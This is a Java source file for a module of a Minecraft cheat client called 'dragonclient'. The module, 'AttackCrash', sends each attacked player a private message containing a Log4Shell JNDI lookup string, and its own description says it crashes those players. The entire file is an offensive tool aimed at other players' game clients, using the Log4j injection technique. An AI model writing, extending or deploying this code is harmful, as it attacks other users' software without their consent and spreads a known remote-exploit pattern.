package dragonclient.module.impl.combat;

import dragonclient.Dragon;
import dragonclient.event.Events.AttackEvent;
import dragonclient.module.Category;
import dragonclient.module.Module;
import dragonclient.module.settings.DescriptionSetting;
import dragonclient.util.TimeUtil;
import net.minecraft.entity.player.EntityPlayer;

public class AttackCrash extends Module {
    private DescriptionSetting description = new DescriptionSetting("Description", "Crashes players when you attack them.");
    public AttackCrash() {
        super("AttackCrash", Category.COMBAT);
        Dragon.eventManager.registerListener(this, AttackEvent.class);
        addSettings(description);
    }

    
    private final TimeUtil timer = new TimeUtil();

    @Override
    public void onAttackEvent(final AttackEvent event) {
        if (event.getTarget() instanceof EntityPlayer && timer.hasReached(1000L)) {
            final EntityPlayer player = (EntityPlayer) event.getTarget();
            mc.player.sendChatMessage("/msg " + player.getName() + " ${jndi:rmi://localhost:3000}");
            timer.reset();
        }
    }
    
}
